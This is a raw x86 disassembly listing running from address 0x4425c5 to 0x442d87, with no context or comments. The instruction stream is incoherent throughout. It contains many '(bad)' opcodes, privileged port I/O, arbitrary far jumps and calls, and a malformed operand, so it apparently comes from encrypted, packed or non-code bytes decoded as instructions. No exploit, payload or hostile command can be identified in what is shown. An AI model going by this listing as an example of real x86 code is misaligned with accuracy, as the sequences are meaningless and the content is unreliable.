  4425c5:	std    
  4425c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4425c7:	push   ebp
  4425c8:	xchg   esi,eax
  4425c9:	xchg   edx,eax
  4425ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4425cb:	and    al,0xfa
  4425cd:	jnp    0x4425ed
  4425cf:	inc    edi
  4425d0:	fnsave [eax]
  4425d2:	sub    dl,BYTE PTR [esi+0x76]
  4425d5:	xchg   edi,eax
  4425d6:	ss aam 0x65
  4425d9:	xchg   ecx,eax
  4425da:	(bad)  
  4425db:	sbb    edi,DWORD PTR [ecx-0x7728bc83]
  4425e1:	jne    0x4425db
  4425e3:	in     eax,0xbf
  4425e5:	test   al,0xcc
  4425e7:	retf   
  4425e8:	test   eax,0xe47faa05
  4425ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4425ee:	cld    
  4425ef:	adc    eax,0xfd1fb3c7
  4425f4:	cmc    
  4425f5:	out    dx,eax
  4425f6:	push   eax
  4425f7:	add    al,0x1e
  4425f9:	retf   0xd58b
  4425fc:	loope  0x44266d
  4425fe:	call   0x2ae8007e
  442603:	cwde   
  442604:	mov    DWORD PTR [ebx+0x70],eax
  442607:	inc    edx
  442608:	outs   dx,BYTE PTR ds:[esi]
  442609:	outs   dx,BYTE PTR ds:[esi]
  44260a:	push   es
  44260b:	xor    BYTE PTR [esi-0x22c56db],cl
  442611:	inc    ecx
  442612:	pop    ds
  442613:	call   0xb8a39fd6
  442618:	data16 add al,0x60
  44261b:	out    dx,eax
  44261c:	je     0x4425c3
  44261e:	mov    ds:0xd5ed821a,al
  442623:	aam    0x1e
  442625:	sbb    eax,0x80bb04c1
  44262a:	popf   
  44262b:	jg     0x4425b5
  44262d:	mov    eax,ds:0x8fa20f80
  442632:	or     eax,DWORD PTR [ebp-0x4e9bfdc0]
  442638:	mov    edi,0x54f71292
  44263d:	rcr    BYTE PTR [edi],0x65
  442640:	loope  0x44263e
  442642:	sti    
  442643:	sbb    al,0x6c
  442645:	push   ecx
  442646:	jbe    0x44261c
  442648:	mov    ah,0xff
  44264a:	scas   al,BYTE PTR es:[edi]
  44264b:	mov    esi,0xd32feda8
  442650:	mov    bl,dh
  442652:	lds    esp,FWORD PTR [edx-0x510a9b37]
  442658:	jae    0x4426cd
  44265a:	sahf   
  44265b:	into   
  44265c:	mov    BYTE PTR [eax+0x17a25fde],dl
  442662:	or     BYTE PTR [ecx+ecx*4],0x45
  442666:	lock jmp 0x423970cb
  44266c:	cwde   
  44266d:	adc    al,0x58
  44266f:	in     eax,0x1a
  442671:	pop    ds
  442672:	xchg   esi,eax
  442673:	xchg   ebp,eax
  442674:	sub    BYTE PTR [eax-0x1e],dl
  442677:	inc    edx
  442678:	mov    ah,0x49
  44267a:	and    BYTE PTR [ebp-0x29885379],al
  442680:	test   eax,0xcac95aca
  442685:	add    eax,0xd27baf00
  44268a:	xor    ah,BYTE PTR ds:0x9b1f1c3e
  442690:	mov    bl,0xc0
  442692:	mov    al,0xfc
  442694:	xor    al,0x9b
  442696:	jp     0x4426a9
  442698:	int    0x2
  44269a:	mov    al,ds:0x42a7413c
  44269f:	gs clc 
  4426a1:	and    edi,DWORD PTR [ebp-0x2d]
  4426a4:	daa    
  4426a5:	(bad)  
  4426a6:	cli    
  4426a7:	push   ebp
  4426a8:	and    eax,esp
  4426aa:	lds    ebx,FWORD PTR [edi-0x2]
  4426ad:	pop    ds
  4426ae:	bound  ebp,QWORD PTR [edi-0x1bd331d0]
  4426b4:	test   al,0x54
  4426b6:	jno    0x44270e
  4426b8:	mov    DWORD PTR [edi-0xefc7b48],ecx
  4426be:	push   ebp
  4426bf:	or     BYTE PTR [eax+0x2],dl
  4426c2:	cmp    BYTE PTR [eax],0xfc
  4426c5:	sbb    DWORD PTR [edi],ecx
  4426c7:	mov    edi,0x436dd504
  4426cc:	pop    edi
  4426cd:	shl    DWORD PTR [ebp+0x2985b690],1
  4426d3:	js     0x442719
  4426d5:	popa   
  4426d6:	pop    eax
  4426d7:	(bad)  [eax-0x3ebad1fe]
  4426dd:	outs   dx,DWORD PTR ds:[esi]
  4426de:	xchg   esi,eax
  4426df:	js     0x4426d7
  4426e1:	adc    ebx,DWORD PTR [edx+0x3205d351]
  4426e7:	sub    ah,BYTE PTR [edi]
  4426e9:	jmp    0x442713
  4426eb:	lock popf 
  4426ed:	add    dl,BYTE PTR [eax-0x32]
  4426f0:	mov    ebx,0xf7018b25
  4426f5:	and    DWORD PTR [edx+0x9],0x8c9de16b
  4426fc:	mov    ah,0x44
  4426fe:	cmp    al,0x76
  442700:	sub    al,0xaa
  442702:	cmp    al,0x2e
  442704:	mov    bh,cl
  442706:	add    ecx,DWORD PTR [esi+edx*4-0x32]
  44270a:	inc    ecx
  44270b:	inc    edi
  44270c:	lods   eax,DWORD PTR ds:[esi]
  44270d:	add    eax,0x135c7a4e
  442712:	aas    
  442713:	cld    
  442714:	pop    ds
  442715:	test   eax,0xe049a11f
  44271a:	jno    0x442736
  44271c:	add    dl,BYTE PTR [eax+0x49]
  44271f:	aad    0x6e
  442721:	imul   eax,ebx,0xf0f2d562
  442727:	adc    DWORD PTR [ecx+0x3d57ae5b],ecx
  44272d:	or     al,0x68
  44272f:	mov    esi,0xa0cc05cb
  442734:	stc    
  442735:	sub    cl,BYTE PTR [edx-0x62f9fabd]
  44273b:	dec    edi
  44273c:	and    eax,0xd189fb02
  442741:	mov    ds:0x6fc612c,eax
  442746:	jmp    FWORD PTR [edx+0x29e226ff]
  44274c:	cmp    ebx,eax
  44274e:	fucomi st,st(7)
  442750:	mov    edx,cs
  442752:	pusha  
  442753:	lods   eax,DWORD PTR ds:[esi]
  442754:	scas   eax,DWORD PTR es:[edi]
  442755:	fs loopne 0x4426f0
  442758:	mov    esi,0x9cd2e446
  44275d:	imul   BYTE PTR [esi-0x15]
  442760:	les    esi,FWORD PTR [ebx-0x697a7db0]
  442766:	aas    
  442767:	jmp    0x442709
  442769:	xchg   ecx,eax
  44276a:	or     eax,0xb200a76c
  44276f:	int3   
  442770:	gs mov ebp,0x8c68d107
  442776:	fcmovnbe st,st(4)
  442778:	xchg   edx,eax
  442779:	mov    esi,0xb35d7052
  44277e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44277f:	pcmpgtw mm5,mm1
  442782:	pusha  
  442783:	(bad)  
  442785:	(bad)  
  442786:	pop    ds
  442787:	xchg   esp,eax
  442788:	or     BYTE PTR [edx],0x78
  44278b:	adc    al,0x4d
  44278d:	xchg   DWORD PTR [ebx-0x17b4869],edx
  442793:	or     BYTE PTR [edi+0x3],bl
  442796:	call   0x23d933f3
  44279b:	mov    dl,0x89
  44279d:	dec    ecx
  44279e:	repnz and bl,BYTE PTR [esi]
  4427a1:	mov    bh,0xd5
  4427a3:	or     BYTE PTR [ebp+0x6a3be602],dh
  4427a9:	jmp    0x442748
  4427ab:	and    al,0x26
  4427ad:	mov    DWORD PTR [ecx+0x51],esp
  4427b0:	jnp    0x44282c
  4427b2:	call   0x75e008a
  4427b7:	stos   DWORD PTR es:[edi],eax
  4427b8:	mov    ecx,0x9f190a17
  4427bd:	push   ecx
  4427be:	sub    eax,0xa485ebcf
  4427c3:	ror    BYTE PTR [edi],0x1f
  4427c6:	je     0x442773
  4427c8:	cli    
  4427c9:	or     DWORD PTR [eax-0x2b],ebp
  4427cc:	xchg   edx,eax
  4427cd:	sub    BYTE PTR [eax+edi*1-0x355fe19b],0x88
  4427d5:	or     dl,cl
  4427d7:	es dec eax
  4427d9:	xchg   esi,eax
  4427da:	push   0x6c
  4427dc:	mov    eax,ds:0x300e464b
  4427e1:	sbb    eax,0x326f8eaa
  4427e6:	mov    dh,0x95
  4427e8:	or     al,0x4
  4427ea:	not    esp
  4427ec:	out    dx,al
  4427ed:	mov    edi,0xe0fb1823
  4427f2:	jo     0x44284f
  4427f4:	mov    BYTE PTR [ebp+0x4d],cl
  4427f7:	clc    
  4427f8:	mov    bh,0x45
  4427fa:	mov    WORD PTR [ebp+0x5e],gs
  4427fd:	add    ch,BYTE PTR [esi+eiz*2-0x5eefbf8e]
  442804:	add    eax,0xae74671
  442809:	sub    BYTE PTR [esi],0xd7
  44280c:	adc    bh,BYTE PTR [eax+ecx*8-0x747e6000]
  442813:	aam    0xce
  442815:	lods   eax,DWORD PTR ds:[esi]
  442816:	push   ecx
  442817:	mov    ss,eax
  442819:	repz or DWORD PTR [esi],0xffffff8b
  44281d:	sub    DWORD PTR [ecx],ecx
  44281f:	mov    cl,0x30
  442821:	popa   
  442822:	es cmp eax,0x68399449
  442828:	pop    esp
  442829:	jp     0x4427f5
  44282b:	aad    0xec
  44282d:	adc    DWORD PTR [ecx+0x1d3d5da7],0x911f4cf6
  442837:	xchg   ecx,eax
  442838:	xchg   edx,eax
  442839:	add    eax,0x7b8ed7b4
  44283e:	cmp    ebx,DWORD PTR [ebx]
  442840:	outs   dx,DWORD PTR ds:[esi]
  442841:	sub    al,0xc4
  442843:	icebp  
  442844:	(bad)  
  442845:	rcr    DWORD PTR [edi],1
  442847:	cmp    eax,0x4b6a594f
  44284c:	mov    DWORD PTR [ebp+0x41],ebp
  44284f:	push   edi
  442850:	mov    fs,WORD PTR ds:0x2f44187
  442856:	dec    edx
  442857:	lods   al,BYTE PTR ds:[esi]
  442858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442859:	add    edi,DWORD PTR ds:0x109c9d8
  44285f:	push   edi
  442860:	test   eax,0x89e946d4
  442865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442866:	leave  
  442867:	xchg   edx,eax
  442868:	retf   
  442869:	push   esi
  44286a:	(bad)  
  44286b:	(bad)  
  44286c:	in     al,dx
  44286d:	xchg   DWORD PTR [edi],esi
  44286f:	bound  ecx,QWORD PTR [ecx+0x45fb40a6]
  442875:	push   ebx
  442876:	push   cs
  442877:	mov    ds:0x7da54788,al
  44287c:	cmp    eax,0x8e36cd19
  442881:	pop    es
  442882:	mov    edx,ebp
  442884:	fs pusha 
  442886:	leave  
  442887:	mov    eax,ds:0xda7e2d85
  44288c:	mov    bl,BYTE PTR [ecx-0x4d25280c]
  442892:	popf   
  442893:	dec    ecx
  442894:	adc    bh,bl
  442896:	adc    dl,bh
  442898:	outs   dx,BYTE PTR ds:[esi]
  442899:	scas   al,BYTE PTR es:[edi]
  44289a:	pop    edx
  44289b:	pop    esi
  44289c:	sub    ch,BYTE PTR [esi+0x7f]
  44289f:	mov    cl,0x89
  4428a1:	mov    ecx,0xe3f84c35
  4428a6:	xchg   esp,eax
  4428a7:	out    dx,eax
  4428a8:	icebp  
  4428a9:	add    BYTE PTR [edx+0x5a],dh
  4428ac:	lahf   
  4428ad:	pop    es
  4428ae:	in     eax,0x7a
  4428b0:	and    al,0xeb
  4428b2:	fisub  WORD PTR [ecx]
  4428b4:	mov    dl,ch
  4428b6:	sub    al,0xcf
  4428b8:	sbb    cl,al
  4428ba:	sbb    ebx,DWORD PTR [esi+eiz*2+0x5ef4516d]
  4428c1:	dec    ecx
  4428c2:	inc    ecx
  4428c3:	aam    0xef
  4428c5:	mov    WORD PTR [esi+0x55],cs
  4428c8:	fisttp QWORD PTR [eax-0x6e77fcff]
  4428ce:	sub    dl,al
  4428d0:	sub    al,0xdf
  4428d2:	push   es
  4428d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4428d4:	ja     0x4428d8
  4428d6:	cli    
  4428d7:	inc    ebx
  4428d8:	test   bl,bl
  4428da:	retf   0xd736
  4428dd:	sbb    eax,0x2a61fd6d
  4428e2:	adc    ebp,DWORD PTR [esi-0x4060a4b7]
  4428e8:	mov    es,WORD PTR [edx]
  4428ea:	xchg   edx,eax
  4428eb:	stos   BYTE PTR es:[edi],al
  4428ec:	sbb    DWORD PTR [ebp-0x27fb2775],0x7b
  4428f3:	mov    bh,0x5e
  4428f5:	xchg   edi,eax
  4428f7:	push   esp
  4428f8:	push   0xffffffa9
  4428fa:	adc    al,0x5b
  4428fc:	xor    eax,DWORD PTR [ebx]
  4428fe:	mov    ?,WORD PTR [ebx]
  442900:	loop   0x442891
  442902:	pop    ebx
  442903:	inc    edi
  442904:	sub    BYTE PTR [edx+ebx*2-0x63],0xe4
  442909:	push   ss
  44290a:	jge    0x44292f
  44290c:	test   DWORD PTR [ebp-0x474d2562],0xe080d472
  442916:	push   esi
  442917:	out    dx,al
  442918:	aas    
  442919:	adc    dl,al
  44291b:	pop    ds
  44291c:	mov    BYTE PTR [ebx+0x4a279384],dl
  442922:	ins    DWORD PTR es:[edi],dx
  442923:	imul   ecx,esi,0x0
  442926:	jle    0x442967
  442928:	std    
  442929:	aam    0x5d
  44292b:	ins    DWORD PTR es:[edi],dx
  44292c:	stos   BYTE PTR es:[edi],al
  44292d:	fstp   QWORD PTR [eax+eiz*4-0x24983598]
  442934:	ins    DWORD PTR es:[edi],dx
  442935:	js     0x4429b1
  442937:	test   al,0x8
  442939:	pop    ds
  44293a:	mov    cl,0x80
  44293c:	jle    0x442940
  44293e:	push   ss
  44293f:	jle    0x4428ea
  442941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442942:	lock test DWORD PTR [esi],eax
  442945:	xchg   DWORD PTR [ecx+0x79],ebx
  442948:	xchg   esi,eax
  442949:	ss pop ds
  44294b:	fcom   QWORD PTR [ebx-0x303409f7]
  442951:	inc    edi
  442952:	ins    BYTE PTR es:[edi],dx
  442953:	add    al,0xe7
  442955:	add    dl,BYTE PTR [ebp+eax*2-0x43d4c19b]
  44295c:	mov    DWORD PTR [ecx-0x1f62de1c],ecx
  442962:	in     al,dx
  442963:	push   ds
  442964:	sbb    al,0x3
  442966:	loopne 0x4429a4
  442968:	xchg   BYTE PTR [ebx-0x12],bl
  44296b:	int3   
  44296c:	mov    al,BYTE PTR [edi]
  44296e:	pusha  
  44296f:	pop    ecx
  442970:	pop    ss
  442971:	add    ebx,DWORD PTR [ebx]
  442973:	fld    DWORD PTR [eax-0x3a]
  442976:	and    esp,edx
  442978:	push   0x68
  44297a:	into   
  44297b:	stc    
  44297c:	xor    cl,BYTE PTR [eax+0xf]
  44297f:	add    DWORD PTR [eax-0x65],ecx
  442982:	adc    DWORD PTR [ecx],eax
  442984:	inc    eax
  442985:	icebp  
  442986:	js     0x4429c4
  442988:	scas   al,BYTE PTR es:[edi]
  442989:	xchg   ebp,eax
  44298a:	gs sbb eax,0x2ebd711e
  442990:	adc    al,0x2
  442992:	retf   0x46e1
  442995:	popa   
  442996:	mov    eax,DWORD PTR [ebp+ecx*4-0x20828236]
  44299d:	pop    ecx
  44299e:	mov    bh,0x54
  4429a0:	(bad)  
  4429a1:	fwait
  4429a2:	test   eax,0x7e05aace
  4429a7:	pop    ebx
  4429a8:	std    
  4429a9:	data16 (bad) 
  4429ab:	ins    BYTE PTR es:[edi],dx
  4429ac:	mov    ebx,0x3696134
  4429b1:	and    eax,0xa9fdf3c2
  4429b6:	lahf   
  4429b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4429b8:	mov    eax,ds:0x5264de00
  4429bd:	mov    bl,0x2a
  4429bf:	stos   BYTE PTR es:[edi],al
  4429c0:	push   cs
  4429c1:	call   0x2160:0xa06a0d2e
  4429c8:	xchg   ecx,eax
  4429c9:	push   ebx
  4429ca:	(bad)  
  4429cb:	cmp    al,BYTE PTR [edi+esi*8+0x4ffa8a70]
  4429d2:	adc    esp,0x361fa5f5
  4429d8:	les    esi,FWORD PTR [edx-0x60aac6e1]
  4429de:	cmc    
  4429df:	xchg   ecx,eax
  4429e0:	imul   ecx,ebp,0xffffffc6
  4429e3:	fidivr DWORD PTR [ebp-0x70934a00]
  4429e9:	or     BYTE PTR [esi-0x1e],bh
  4429ec:	ins    DWORD PTR es:[edi],dx
  4429ed:	cli    
  4429ee:	nop
  4429ef:	dec    esi
  4429f0:	xchg   esi,eax
  4429f1:	dec    edi
  4429f2:	dec    ebx
  4429f3:	in     eax,0xd3
  4429f5:	popf   
  4429f6:	jno    0x442a71
  4429f8:	call   0xe618707f
  4429fd:	pushf  
  4429fe:	cld    
  4429ff:	mov    gs,WORD PTR [ecx+eax*1]
  442a02:	ret    0x89fd
  442a05:	mov    DWORD PTR [edi+0x60],ebx
  442a08:	xor    ch,ah
  442a0a:	sbb    eax,0x6805828a
  442a0f:	nop
  442a10:	into   
  442a11:	dec    eax
  442a12:	xchg   edi,eax
  442a13:	jne    0x4429a0
  442a15:	das    
  442a16:	or     al,0x2
  442a18:	xchg   edi,eax
  442a19:	outs   dx,DWORD PTR ds:[esi]
  442a1a:	push   eax
  442a1b:	push   ds
  442a1c:	aam    0x45
  442a1e:	jmp    0x1784:0x3847809c
  442a25:	add    cl,al
  442a27:	push   esp
  442a28:	or     ecx,DWORD PTR [ecx]
  442a2a:	pop    ds
  442a2b:	or     DWORD PTR ds:0xdcb5dbd1,edi
  442a31:	mov    esi,0xb86dd4e4
  442a36:	aam    0xc9
  442a38:	neg    DWORD PTR [eax]
  442a3a:	xor    al,0xda
  442a3c:	mov    BYTE PTR ds:0x6bc34a2c,ch
  442a42:	cli    
  442a43:	(bad)  
  442a44:	rcl    DWORD PTR [edx+eax*2],cl
  442a47:	adc    cl,bh
  442a49:	scas   al,BYTE PTR es:[edi]
  442a4a:	push   esp
  442a4b:	xor    al,0xc5
  442a4d:	fs (bad) 
  442a4f:	pop    esi
  442a50:	mov    ch,BYTE PTR [edi-0x41]
  442a53:	ret    
  442a54:	stos   DWORD PTR es:[edi],eax
  442a55:	xchg   esi,eax
  442a56:	dec    ecx
  442a57:	adc    BYTE PTR gs:[ebx-0x1de32b49],bh
  442a5e:	retf   
  442a5f:	sbb    eax,0xff912837
  442a64:	sbb    BYTE PTR [ecx+0x6dea02e8],0x9e
  442a6b:	or     bh,bh
  442a6d:	push   0x245c105
  442a72:	lods   al,BYTE PTR ds:[esi]
  442a73:	jnp    0x442ab9
  442a75:	std    
  442a76:	dec    edi
  442a77:	adc    al,0xac
  442a79:	mov    ebp,0xbd9c3b1f
  442a7e:	(bad)  
  442a7f:	lods   al,BYTE PTR ds:[esi]
  442a80:	in     al,dx
  442a81:	jbe    0x442ad8
  442a83:	aam    0x61
  442a85:	push   esi
  442a86:	push   ebx
  442a87:	cmc    
  442a88:	push   ebx
  442a89:	int3   
  442a8a:	mov    dl,0x1f
  442a8c:	xchg   edi,eax
  442a8d:	lahf   
  442a8e:	add    eax,0x3c023b15
  442a93:	pop    eax
  442a94:	mov    ds:0x96d57d85,al
  442a99:	jmp    0xc122:0x8340c4de
  442aa0:	mov    BYTE PTR [edi-0x481de73b],ch
  442aa6:	or     edi,DWORD PTR [esi+0x1bc14bc]
  442aac:	fsubr  QWORD PTR [edx]
  442aae:	xor    al,0xd7
  442ab0:	imul   esi,DWORD PTR [ecx+0x59891a8a],0x5cd1d2f2
  442aba:	or     DWORD PTR [ebx],0xffffff98
  442abd:	add    eax,0xbaf5c484
  442ac2:	pop    esi
  442ac3:	(bad)  
  442ac5:	lods   al,BYTE PTR ds:[esi]
  442ac6:	pop    ds
  442ac7:	arpl   WORD PTR [ebp-0x6980bbce],di
  442acd:	mov    ch,0xe7
  442acf:	mov    dh,BYTE PTR [eax-0x1a]
  442ad2:	inc    ebx
  442ad3:	aam    0xe7
  442ad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442ad6:	xor    esi,0xcb6030a0
  442adc:	push   ebx
  442add:	fnstsw WORD PTR ss:[eax]
  442ae0:	popa   
  442ae1:	leave  
  442ae2:	xlat   BYTE PTR ds:[ebx]
  442ae3:	fidiv  WORD PTR [edx-0x1ec237fb]
  442ae9:	sahf   
  442aea:	xchg   edx,eax
  442aeb:	jbe    0x442aca
  442aed:	push   es
  442aee:	pop    ecx
  442aef:	mov    ecx,DWORD PTR [edx-0x3a5e9f01]
  442af5:	sbb    eax,0xfffffff9
  442af8:	sbb    eax,DWORD PTR [ebp-0x6a]
  442afb:	fstp   QWORD PTR [ebx-0x7d]
  442afe:	add    ebp,esp
  442b00:	xor    dl,BYTE PTR [ecx-0x5e76b7ab]
  442b06:	push   0x294f1e3
  442b0b:	xchg   BYTE PTR [edx],dl
  442b0d:	xor    esp,DWORD PTR [edi*2-0x30bd1c85]
  442b14:	popf   
  442b15:	mov    ebp,0x2a316a7c
  442b1a:	pop    ds
  442b1b:	leave  
  442b1c:	popa   
  442b1d:	jecxz  0x442b53
  442b1f:	pop    es
  442b20:	mov    ebp,0x7045f802
  442b25:	nop
  442b26:	clc    
  442b27:	pop    esi
  442b28:	ins    BYTE PTR es:[edi],dx
  442b29:	sub    BYTE PTR [esi],bl
  442b2b:	mov    eax,ds:0x2f40cf09
  442b30:	adc    BYTE PTR [eax],0x5d
  442b33:	aam    0x7d
  442b35:	mov    WORD PTR [edi],es
  442b37:	mov    fs:0x89683040,al
  442b3d:	adc    edx,DWORD PTR [esi+0x2ca5139]
  442b43:	push   esi
  442b44:	mov    ds:0xf6d5fee9,al
  442b49:	inc    ebp
  442b4a:	(bad)  
  442b4b:	mov    edx,0xe8605a3b
  442b50:	mov    BYTE PTR [ecx],cl
  442b52:	imul   edi,DWORD PTR [edi-0x4d],0x3f
  442b56:	sub    BYTE PTR [edi-0x2d9606da],bl
  442b5c:	fdiv   QWORD PTR [edi]
  442b5e:	ds push ecx
  442b60:	rol    DWORD PTR [edx-0x7d61af80],1
  442b66:	mov    eax,ds:0xfeaa06e8
  442b6b:	imul   eax,DWORD PTR [edx-0x3df80d5b],0x36
  442b72:	gs dec edx
  442b74:	xor    al,0x53
  442b76:	out    0x1f,eax
  442b78:	fild   DWORD PTR [edx]
  442b7a:	mov    ds:0xb9ea0da4,al
  442b7f:	sub    esi,0x44
  442b82:	push   ds
  442b83:	ror    DWORD PTR [edi+0x6e],cl
  442b86:	call   0x4d9b:0x9b264cd2
  442b8d:	mov    bh,0x4e
  442b8f:	push   ebp
  442b90:	jnp    0x442c0c
  442b92:	sub    DWORD PTR [ebx],0x1f71e6d5
  442b98:	and    DWORD PTR [edi],ecx
  442b9a:	retf   0x57d5
  442b9d:	mov    cl,0xf5
  442b9f:	pop    ecx
  442ba0:	sbb    eax,DWORD PTR [edx]
  442ba2:	es xor al,0xf2
  442ba5:	ss cld 
  442ba7:	(bad)  
  442ba8:	cmp    DWORD PTR [ecx],esp
  442baa:	mov    ax,ds:0x10177820
  442bb0:	or     DWORD PTR [ebx-0x7],edi
  442bb3:	loop   0x442c2a
  442bb5:	add    bh,BYTE PTR [esi]
  442bb7:	imul   edx,ebx,0xffffffb1
  442bba:	xchg   edx,eax
  442bbb:	retf   
  442bbc:	mov    bh,BYTE PTR ds:0xc89cd364
  442bc2:	sub    DWORD PTR [ebx-0x68],0xffffffd2
  442bc6:	push   ds
  442bc7:	aaa    
  442bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442bc9:	jb     0x442c3f
  442bcb:	mov    edx,0xd15f2388
  442bd0:	outs   dx,BYTE PTR ds:[esi]
  442bd1:	es xchg ebp,eax
  442bd3:	js     0x54ac9566
  442bd9:	add    edi,DWORD PTR [ecx]
  442bdb:	sbb    dl,BYTE PTR [ecx]
  442bdd:	add    edx,eax
  442bdf:	mov    esi,0x88633632
  442be4:	push   cs
  442be5:	cli    
  442be6:	aam    0xe
  442be8:	outs   dx,DWORD PTR ds:[esi]
  442be9:	sbb    BYTE PTR [ebx+ecx*8+0x6],ah
  442bed:	arpl   WORD PTR [ecx+esi*4-0x62],cx
  442bf1:	mov    ds:0x1f104298,al
  442bf6:	adc    al,0xca
  442bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442bf9:	retf   
  442bfa:	stos   DWORD PTR es:[edi],eax
  442bfb:	and    DWORD PTR [eax],ecx
  442bfd:	jmp    0x9bccdac3
  442c02:	sbb    al,0xc4
  442c04:	xor    al,0xbf
  442c06:	xchg   esi,eax
  442c07:	jmp    0xa556:0xbc250f8c
  442c0e:	retf   0xac73
  442c11:	inc    ebx
  442c12:	iret   
  442c13:	repz mov cl,0x2
  442c16:	lea    ebp,cs:[ecx-0x15522faf]
  442c1d:	add    al,BYTE PTR [edx]
  442c1f:	fcmovnb st,st(3)
  442c21:	sbb    eax,ebp
  442c23:	cld    
  442c24:	add    edi,0x37a44560
  442c2a:	loop   0x442c79
  442c2c:	or     al,BYTE PTR [eax]
  442c2e:	pop    edx
  442c2f:	stos   BYTE PTR es:[edi],al
  442c30:	mov    ds:0x7ffb7467,eax
  442c35:	cld    
  442c36:	mov    edi,0x93657995
  442c3b:	mov    dh,0x89
  442c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442c3e:	fsub   DWORD PTR [ebp-0x6a]
  442c41:	out    dx,al
  442c42:	mov    bl,0xc5
  442c44:	pop    ds
  442c45:	(bad)  
  442c46:	jmp    0xbb79b4e7
  442c4b:	mov    esp,0x4decd73b
  442c50:	mov    ebx,edi
  442c52:	lahf   
  442c53:	adc    DWORD PTR [ebx],esi
  442c55:	push   cs
  442c56:	test   BYTE PTR [edx-0x3d7e791b],ah
  442c5c:	mov    dh,cl
  442c5e:	outs   dx,DWORD PTR ds:[esi]
  442c5f:	icebp  
  442c60:	inc    ecx
  442c61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442c62:	mov    ds:0xc1af890a,eax
  442c67:	(bad)  
  442c68:	int3   
  442c69:	add    DWORD PTR [ebx+0x5e],ebx
  442c6c:	sub    eax,0x98b63202
  442c71:	and    esi,DWORD PTR [edx-0x7b]
  442c74:	mov    ds:0x87481625,al
  442c79:	lods   eax,DWORD PTR ds:[esi]
  442c7a:	push   esp
  442c7b:	dec    ecx
  442c7c:	repnz popf 
  442c7e:	pop    edi
  442c7f:	sar    DWORD PTR [eax],cl
  442c81:	mov    cl,0x11
  442c83:	(bad)  
  442c84:	inc    DWORD PTR [edx]
  442c86:	push   cs
  442c87:	(bad)  
  442c88:	mov    edx,0x9f10437f
  442c8d:	xchg   BYTE PTR [ecx+0x19],ah
  442c90:	push   edi
  442c91:	sar    DWORD PTR [eax+ebp*1+0x18],0x80
  442c96:	lahf   
  442c97:	int3   
  442c98:	lock dec ebx
  442c9a:	aam    0x4
  442c9c:	add    BYTE PTR [edx+0x601f928],0x8c
  442ca3:	mov    eax,ds:0x26a7a589
  442ca8:	inc    edi
  442ca9:	xchg   edi,eax
  442caa:	sti    
  442cab:	call   0x245e:0xf7920247
  442cb2:	add    eax,DWORD PTR [edi]
  442cb4:	add    ebx,DWORD PTR [ecx-0x2116ce1]
  442cba:	inc    ebp
  442cbb:	adc    DWORD PTR [esi],ebp
  442cbd:	bswap  ebx
  442cbf:	aam    0x0
  442cc1:	sub    al,0x2c
  442cc3:	fsub   DWORD PTR [ecx+0x6d]
  442cc6:	jae    0x442d2a
  442cc8:	mov    BYTE PTR [edi-0x1c],cl
  442ccb:	fnsave [eax-0x2e]
  442cce:	mov    ds:0x3402309e,eax
  442cd3:	add    edx,ebx
  442cd5:	(bad)  
  442cd6:	sbb    eax,DWORD PTR ds:0xc34bab3c
  442cdc:	push   esi
  442cdd:	and    ch,BYTE PTR [ebp-0x17]
  442ce0:	aam    0xb9
  442ce2:	loopne 0x442d4c
  442ce4:	mov    bl,0xef
  442ce6:	fistp  DWORD PTR gs:[ebx+0x2]
  442cea:	fs cmp al,0x25
  442ced:	pusha  
  442cee:	mov    ds:0x1fa9ac94,eax
  442cf3:	retf   
  442cf4:	imul   eax,edx,0x9c6a04f6
  442cfa:	inc    ebp
  442cfb:	test   DWORD PTR [edx],esi
  442cfd:	pusha  
  442cfe:	dec    esp
  442cff:	push   ecx
  442d00:	add    cl,BYTE PTR [edi+ebx*1-0xb]
  442d04:	in     al,dx
  442d05:	pop    eax
  442d06:	cmp    eax,0x195da851
  442d0b:	ror    esi,1
  442d0d:	cdq    
  442d0e:	fimul  WORD PTR [edx]
  442d10:	stos   BYTE PTR es:[edi],al
  442d11:	sub    bl,ah
  442d13:	push   edi
  442d14:	scas   eax,DWORD PTR es:[edi]
  442d15:	in     eax,0x5a
  442d17:	mov    al,0x96
  442d19:	inc    edi
  442d1a:	or     eax,0xc3c2f7d2
  442d1f:	xchg   ebp,eax
  442d20:	rol    BYTE PTR [edx+0x40c3b87b],1
  442d26:	subps  xmm1,XMMWORD PTR [eax]
  442d29:	sbb    esp,DWORD PTR [eax-0x74]
  442d2c:	lods   al,BYTE PTR ds:[esi]
  442d2d:	xchg   esi,eax
  442d2e:	pop    ds
  442d2f:	add    edi,0x5d
  442d32:	add    eax,0xa5fe7cd4
  442d37:	aam    0x9
  442d39:	xchg   edi,eax
  442d3a:	jmp    0x8844:0x2bf0c984
  442d41:	pop    ebp
  442d42:	or     bl,bh
  442d44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442d45:	mov    edx,0x4e023c03
  442d4b:	(bad)  
  442d4d:	sbb    ah,BYTE PTR [edx+0x58b471ed]
  442d53:	(bad)  
  442d54:	div    ebx
  442d56:	loopne 0x442d87
  442d58:	(bad)  
  442d59:	cmp    al,0xba
  442d5b:	pop    esp
  442d5c:	mov    DWORD PTR [edx],eax
  442d5e:	push   esp
  442d5f:	mov    ebp,0xd89683fe
  442d64:	jg     0x442d72
  442d66:	push   cs
  442d67:	jmp    0x69a2:0xaa7f2988
  442d6e:	or     BYTE PTR [esi-0x72e7b876],bh
  442d74:	sub    bl,BYTE PTR [edx]
  442d76:	mov    bh,0x9d
  442d78:	enter  0x9685,0x13
  442d7c:	pop    ds
  442d7d:	add    al,0x60
  442d7f:	rcr    eax,cl
  442d81:	add    DWORD PTR [esi-0x26f9f7d6],edi
  442d87:	aam    0x7a
